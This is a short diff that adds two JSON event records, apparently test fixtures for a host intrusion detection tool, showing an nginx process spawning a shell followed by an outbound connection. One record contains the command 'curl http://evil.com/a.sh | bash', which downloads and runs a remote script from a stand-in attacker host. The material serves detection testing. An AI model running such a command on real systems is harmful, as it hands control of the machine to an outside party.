@@ -1,0 +1,2 @@
+{"host_name":"web-01","host_ip":"10.0.1.5","time":"2026-06-21T09:15:22+08:00","event_type":"exec","listener_port":443,"listener_process":"nginx","listener_pid":1234,"pid":5678,"ppid":1234,"exe":"/bin/bash","command":"/bin/sh -c curl http://evil.com/a.sh | bash","cwd":"/var/www/html","tty":"pts/0","has_tty":true}
+{"host_name":"web-01","host_ip":"10.0.1.5","time":"2026-06-21T09:15:25+08:00","event_type":"active_connect","listener_port":443,"listener_process":"nginx","listener_pid":1234,"pid":5679,"dst_ip":"203.0.113.99","dst_port":443,"protocol":"tcp"}
